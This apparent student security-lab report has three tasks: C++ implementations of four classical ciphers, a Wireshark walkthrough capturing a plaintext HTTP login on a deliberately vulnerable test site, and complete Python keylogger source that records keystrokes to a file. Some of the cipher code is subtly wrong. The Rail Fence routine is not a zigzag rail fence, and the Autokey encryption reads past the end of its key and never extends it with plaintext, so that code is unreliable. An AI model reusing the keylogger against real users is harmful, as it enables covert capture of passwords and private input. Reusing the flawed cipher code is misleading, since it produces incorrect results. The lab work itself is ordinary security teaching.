@@ -1,0 +1,217 @@
+Lab Task 1: Implement Ceaser cipher, Vigenere cipher, Rail Fence cipher, Autokey Cipher in any programming language. Both encryption and decryption method should be included. Submit a report with the codes and screenshot of output.
+Solution:
+
+
+
+1.	Caesar Cipher:
+o	Source Code in C++:
+#include <iostream>
+#include <string>
+
+using namespace std;
+
+string encryptCaesar(string text, int shift) {
+    for (char& c : text) {
+        if (isalpha(c)) {
+            char base = isupper(c) ? 'A' : 'a';
+            c = (c - base + shift) % 26 + base;
+        }
+    }
+    return text;
+}
+
+string decryptCaesar(string text, int shift) {
+    return encryptCaesar(text, 26 - shift);
+}
+
+int main() {
+    string plaintext = "Hello, World!";
+    int shift = 3;
+    string encrypted = encryptCaesar(plaintext, shift);
+    string decrypted = decryptCaesar(encrypted, shift);
+    cout << "Plaintext: " << plaintext << endl;
+    cout << "Encrypted: " << encrypted << endl;
+    cout << "Decrypted: " << decrypted << endl;
+    return 0;
+}
+
+
+
+
+
+2.	Vigenere Cipher:
+o	Source Code in C++:
+#include <iostream>
+#include <string>
+using namespace std;
+string encryptVigenere(string text, string key) {
+    for (size_t i = 0; i < text.size(); ++i) {
+        if (isalpha(text[i])) {
+            char base = isupper(text[i]) ? 'A' : 'a';
+            char keyChar = key[i % key.size()];
+            text[i] = (text[i] - base + keyChar - 'A') % 26 + base;
+        }
+    }
+    return text;
+}
+
+string decryptVigenere(string text, string key) {
+    for (size_t i = 0; i < text.size(); ++i) {
+        if (isalpha(text[i])) {
+            char base = isupper(text[i]) ? 'A' : 'a';
+            char keyChar = key[i % key.size()];
+            text[i] = (text[i] - base - (keyChar - 'A') + 26) % 26 + base;
+        }
+    }
+    return text;
+}
+
+int main() {
+    string plaintext = "Hello, World!";
+    string key = "KEY";
+    string encrypted = encryptVigenere(plaintext, key);
+    string decrypted = decryptVigenere(encrypted, key);
+    cout << "Plaintext: " << plaintext << endl;
+    cout << "Encrypted: " << encrypted << endl;
+    cout << "Decrypted: " << decrypted << endl;
+    return 0;
+}
+
+
+
+
+3.	Rail Fence Cipher:
+o	Source Code in C++:
+#include <iostream>
+#include <string>
+using namespace std;
+string encryptRailFence(string text, int rails) {
+    string result;
+    for (int i = 0; i < rails; ++i) {
+        for (int j = i; j < text.size(); j += rails) {
+            result += text[j];
+        }
+    }
+    return result;
+}
+string decryptRailFence(string text, int rails) {
+    string result(text.size(), ' ');
+    int index = 0;
+    for (int i = 0; i < rails; ++i) {
+        for (int j = i; j < text.size(); j += rails) {
+            result[j] = text[index++];
+        }
+    }
+    return result;
+}
+
+int main() {
+    string plaintext = "Hello, World!";
+    int rails = 3;
+    string encrypted = encryptRailFence(plaintext, rails);
+    string decrypted = decryptRailFence(encrypted, rails);
+    cout << "Plaintext: " << plaintext << endl;
+    cout << "Encrypted: " << encrypted << endl;
+    cout << "Decrypted: " << decrypted << endl;
+    return 0;
+}
+
+
+
+
+4.	Autokey Cipher:
+o	Source Code in C++:
+#include <iostream>
+#include <string>
+
+using namespace std;
+
+string encryptAutokey(string text, string key) {
+    for (size_t i = 0; i < text.size(); ++i) {
+        if (isalpha(text[i])) {
+            char base = isupper(text[i]) ? 'A' : 'a';
+            char keyChar = isupper(key[i]) ? key[i] : key[i] - 'a' + 'A';
+            text[i] = (text[i] - base + keyChar - 'A') % 26 + base;
+        }
+    }
+    return text;
+}
+
+string decryptAutokey(string text, string key) {
+    for (size_t i = 0; i < text.size(); ++i) {
+        if (isalpha(text[i])) {
+            char base = isupper(text[i]) ? 'A' : 'a';
+            char keyChar = isupper(key[i]) ? key[i] : key[i] - 'a' + 'A';
+            text[i] = (text[i] - base - (keyChar - 'A') + 26) % 26 + base;
+            key += text[i];
+        }
+    }
+    return text;
+}
+
+int main() {
+    string plaintext = "Hello, World!";
+    string key = "KEY";
+    string encrypted = encryptAutokey(plaintext, key);
+    string decrypted = decryptAutokey(encrypted, key);
+    cout << "Plaintext: " << plaintext << endl;
+    cout << "Encrypted: " << encrypted << endl;
+    cout << "Decrypted: " << decrypted << endl;
+    return 0;
+}
+
+
+
+
+
+Lab Task 2: Install WireShark and start packet tracing then visit http://testphp.vulnweb.com/login.php to capture data and see if you can steal the login info. Write a report with how did you complete the procedure with screenshots.
+Solution: This is the step-by-step process of capturing login info using Wireshark tool.
+Step 1: Opening Wireshark tool and start capturing Wi-Fi packets.
+ 
+Fig 2.1: Opening Wireshark tool
+  
+Fig 2.2: Selecting Wi-Fi
+Step 2: In the display filter bar, using “http” keyword to find only the captured HTTP packets.
+  
+Fig 2.3: Using “http” keyword in the display filter bar
+
+Step 3: Visiting http://testphp.vulnweb.com/login.php webpage in the browser.
+  
+Fig 2.4: Visiting http://testphp.vulnweb.com/login.php webpage
+
+Step 4: Entering the Username and Password, and then clicking on the login button. 
+Username: iambatman@gmail.com
+Password: I#am#BATMAN
+  
+Fig 2.5: Login with username and password
+
+Step 5: Going back to the Wireshark tool and selecting the packet with “/userinfo.php” in the info section.
+  
+Fig 2.6: Selecting the captured packed
+Step 6: Extending the “HTML From URL Encoded” section and there we can see the same uname (username) and pass (password) what I have entered in the webpage.
+Form item: "uname" = "iambatman@gmail.com"
+Form item: "pass" = "I#am#BATMAN"
+
+
+
+
+ 
+Lab Task 3: Write a key logger to record the keyboard strokes from a computer using any programming language. Write report with the code and screenshot of the output. 
+Solution:
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyLogger.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("UNRECOGNIZED")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+
+
